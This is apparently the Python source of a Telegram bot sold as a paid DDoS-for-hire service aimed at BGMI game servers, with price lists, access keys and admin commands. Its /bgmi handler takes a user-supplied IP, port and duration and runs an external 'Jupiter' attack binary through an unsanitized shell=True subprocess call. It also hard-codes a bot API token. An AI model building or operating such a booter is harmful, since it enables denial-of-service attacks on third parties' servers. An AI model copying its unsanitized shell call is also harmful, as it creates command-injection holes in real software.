# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
import telebot
import subprocess
import datetime
import os
import time


# insert your Telegram bot token here
bot = telebot.TeleBot('8186143877:AAHAFnhPGALeR7Q2GXVf0iUvWYk9iTT1yB4')

API_TOKEN = '8186143877:AAHAFnhPGALeR7Q2GXVf0iUvWYk9iTT1yB4'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

# Define the owner's user ID
OWNER_ID = 5616232839  # Replace with your actual Telegram user ID
# Admin user IDs
admin_id = ["5616232839"]
# Replace with your actual admin user IDs
ADMIN_IDS = [5616232839]  # Example admin user ID

# File to store allowed user IDs
USER_FILE = "users.txt"

# Define a dictionary to store keys and their validity status
keys = {}

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["5616232839"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"💐 HELLO {user_to_add}!\n🎉 CONGRATULATIONS! YOU'RE APPROVED ✅ \n🌟 WELCOME TO THE ARMAN TEAM!\n🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n👤 APPROVED BY @KvnAlpha\n\nAPPROVED FOR{duration} {time_unit}\n⚡\nACCESS WILL BE ACTIVE UNTIL{user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍.\n\n💫 LET THE FUN BEGIN! 🎊."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @KvnAlpha."

    bot.reply_to(message, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['myinfo'])
def send_user_info(message):
    bot.reply_to(message, "CHECKING YOUR WHOLE INFO....")
    time.sleep(3)  # Simulate a delay for checking info

    user_info = f"""
    Username: @{message.from_user.username}
    User ID: {message.from_user.id}
    First Name: {message.from_user.first_name}
    Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}
    Last Seen: (This information is not available due to privacy settings)
    Status: (This information is not available)
    Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}
    Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}
    """
    
    bot.send_message(message.chat.id, user_info)

def user_used_bot(user_id):
    # Implement logic to check if the user has used the bot before
    return False  # Placeholder
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @KvnAlpha 🙇."

    bot.reply_to(message, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @KvnAlpha ❄."
    bot.reply_to(message, response)

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @KvnAlpha 🙇."
    bot.reply_to(message, response)
 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @KvnAlpha❄."
    bot.reply_to(message, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @KvnAlpha \n205 KALA JADU "
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌠 STRATEGY DEPLOYED 🌠\n\n🚀 TARGET LOCKED [ ON YOUR SERVER ]... 💥\n⚔ BATTLE HAS COMMENCED ⚔\n\n🥷 ASSAULTING HOST ==) ( {target} )\n🥷 ENGAGED PORT ==) ( {port} )\n⏰ ATTACK DURATION -> ( {time} ) SECONDS 🔥\n\n💎 EXECUTED BY ARMAN TEAM ⚔\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX 💫\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @KvnAlpha"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @KvnAlpha"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Jupiter {target} {port} {time}"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙. 𝙀𝙫𝙚𝙧𝙮 𝙘𝙡𝙤𝙪𝙙 𝙤𝙛 𝙙𝙚𝙨𝙤𝙡𝙖𝙩𝙞𝙤𝙣 𝙣𝙤𝙬 𝙙𝙖𝙧𝙠𝙚𝙣𝙨\n\n💥 𝙂𝙞𝙫𝙚 𝙣𝙤 𝙫𝙤𝙞𝙘𝙚 𝙩𝙤 𝙨𝙩𝙧𝙞𝙭 𝙛𝙤𝙧 𝙡𝙞𝙣𝙪𝙨! 🚨 𝘿𝙞𝙎𝘾𝙊𝙉𝙏𝙀𝙉𝙏 🏴‍☠️\n\n👁️ 𝙒𝘼𝙏𝘾𝙃 𝙤𝙪𝙩 𝙛𝙤𝙧 𝙧𝙚𝙩𝙡𝙖𝙩𝙞𝙤𝙣𝙨! 𝙏𝙝𝙚 𝙟𝙤𝙪𝙧𝙣𝙖𝙡 𝙤𝙛 𝙖𝙣𝙖𝙧𝙘𝙝𝙮 𝙝𝙖𝙨 𝙗𝙚𝙜𝙪𝙣."
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "📝 DEAR USERS \n\n📜 USAGE DETAILS:\n/bgmi <IP> <PORT> <TIME>\n\n✨ EXAMPLE:\n- /bgmi 20.0.0.0 8700 120\n\n⚔️ LET'S THE WAR BEGIN!\n\n🔍 MORE INFORMATION:\n- <IP>: Target's IP address\n- <PORT>: Specific port for the attack\n- <TIME>: Duration of the attack in seconds\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @KvnAlpha"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT.ꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @KvnAlpha")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @KvnAlpha ✅")
    bot.reply_to(message, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['help'])
def send_help_message(message):
    bot.send_message(message.chat.id, "It seems like you would like more information! Here’s what each command does")
    time.sleep(0.5)  # Wait for 0.5 seconds

    bot.send_message(message.chat.id, "💥 /bgmi : Initiate an attack on your target. Be prepared for the results! 🚀")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /rules : Review the rules to understand the guidelines and regulations of the platform. ⚖️")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /mylogs : Check your activity logs to track your actions and engagements. 📜")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /plan : Explore the different plans available to enhance your experience. 🌟")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /myinfo : Access details about your account, including settings and status. 🔍")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /admincmd : (Admins only) View all available commands meant for admin users. 📋")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "If you need any specific command to be executed or further information, just let me know!")

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
keys = {}

def generate_key(days):
    return f"KEY-{days}-DAYS"

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return
    
    try:
        # Extract days from the command
        parts = message.text.split()
        days = int(parts[1])  # Example: /genkey 99
        new_key = generate_key(days)
        keys[new_key] = True  # Store key as valid
        bot.send_message(message.chat.id, f"Generated key: {new_key}")

    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Usage: /genkey <number of days>")

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    key_to_redeem = message.text.split(maxsplit=1)

    if len(key_to_redeem) != 2:
        response = "Usage: /redeem <key>"
        bot.send_message(message.chat.id, response)
        return 

    key_value = key_to_redeem[1]

    if key_value in keys:
        if keys[key_value]:
            response = f"Key '{key_value}' redeemed successfully!"
            keys[key_value] = False  # Mark key as used
        else:
            response = f"Key '{key_value}' has already been redeemed."
    else:
        response = "Invalid key. Please check and try again."

    bot.send_message(message.chat.id, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 

def loading_animation(chat_id):
    for i in range(3):
        loading_text = "LOADING" + '.' * (i + 1)
        bot.send_message(chat_id, loading_text)
        time.sleep(1)  # Wait for 1 second for each loading stage
    bot.send_message(chat_id, "Done loading!.")  # Final message

@bot.message_handler(commands=['start'])
def send_start_message(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton('ATTACK')
    btn_price_list = telebot.types.KeyboardButton('PRICE LIST')
    btn_how_to_use = telebot.types.KeyboardButton('HOW TO USE')
    btn_contact_owner = telebot.types.KeyboardButton('CONTACT OWNER')
    btn_wrong_ips = telebot.types.KeyboardButton("WRONG IP's")
    btn_soon1 = telebot.types.KeyboardButton('SOON')
    btn_soon2 = telebot.types.KeyboardButton('SOON')

    markup.add(btn_attack, btn_price_list, btn_how_to_use, btn_contact_owner, btn_wrong_ips, btn_soon1, btn_soon2)

    welcome_message = "Welcome! Choose an option below:\n"
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'ATTACK')
def attack_info(message):
    bot.send_message(message.chat.id, "USAGE - /bgmi\n\nEXAMPLE - /bgmi 20.0.0.0 877 10")

@bot.message_handler(func=lambda message: message.text == 'PRICE LIST')
def price_list(message):
    bot.send_message(message.chat.id, 
                     "3.5 updated prices -\n"
                     "1 DAY - 120\n"
                     "4 DAY - 200\n"
                     "7 DAY - 300\n"
                     "30 DAY - 999")

@bot.message_handler(func=lambda message: message.text == 'HOW TO USE')
def how_to_use(message):
    bot.send_message(message.chat.id, "YOU CAN WATCH VIDEO'S ON YOUTUBE!")

@bot.message_handler(func=lambda message: message.text == 'CONTACT OWNER')
def contact_owner(message):
    owner_id = "{owner_id}"  # Replace with actual owner ID.
    bot.send_message(message.chat.id,
                     f"HERE'S THE BOT OWNER ID - @KvnAlpha\n"
                     f"TG ID - {owner_id}\n"
                     "OPEN CHAT - [LINK](http://t.me/KvnAlpha)",
                     parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "WRONG IP's")
def wrong_ips(message):
    bot.send_message(message.chat.id, 
                     "HERE'S THE WRONG IP's:\n"
                     "1. 20003\n"
                     "2. 20001\n"
                     "3. 20002\n"
                     "4. 17500\n"
                     "5. 10000 SE NICHE VALE 😂\n"
                     "6. 30000 SE UPAR\n"
                     "7. 447☠️\n"
                     "DONE ✅")

@bot.message_handler(func=lambda message: message.text == 'SOON')
def soon_info(message):
    bot.send_message(message.chat.id, "EMPTY MESSAGE SOON TO MORE FUTURES")

@bot.message_handler(commands=['restart'])
def restart_command(message):
    bot.send_message(message.chat.id, "Starting your request...")
    
    # Start loading animation in a separate thread
    threading.Thread(target=loading_animation, args=(message.chat.id,)).start()
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['admincmd'])
def welcome_admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''🌟 Hello, {user_name}! Here Are Your Admin Commands:

🔧 Admin Commands Overview:
💥 /add <userId> - Add a new user to the system.
💥 /remove <userId> - Remove an existing user from the system.
💥 /allusers - Retrieve a list of all authorized users.
💥 /logs - Access the logs of all user activities.
💥 /broadcast <message> - Send a broadcast message to all users.
💥 /clearlogs - Clear the logs file to remove all past records.
💥 /clearusers - Clear the users file to refresh the user list.
💥 /help - Display detailed information about each command.

📊 Additional Admin Commands:
💥 /status - Show the current status of the server and active connections.
💥 /mute <userId> - Temporarily mute a specific user.
💥 /unmute <userId> - Unmute a previously muted user.
💥 /restart - Restart the bot for updates or maintenance.
💥 /backup - Create a backup of user data and logs for safety.
💥 /settings - Access and modify the bot's configuration settings.

🛠️ Tips for Admins:
- Always double-check user IDs before using /remove or /mute commands.
- Use /broadcast responsibly to avoid spamming users.
- Keep logs secure and regularly backup important data.

📩 Need Help? 
Feel free to reach out if you have any questions or need assistance with these commands!

🌟 Empower Your Admin Role Today!
'''
    bot.reply_to(message, response)
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝘼𝙇𝙀𝙍𝙏 ⚠️‼️:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
# SCRIPY BYE - @KvnAlpha 
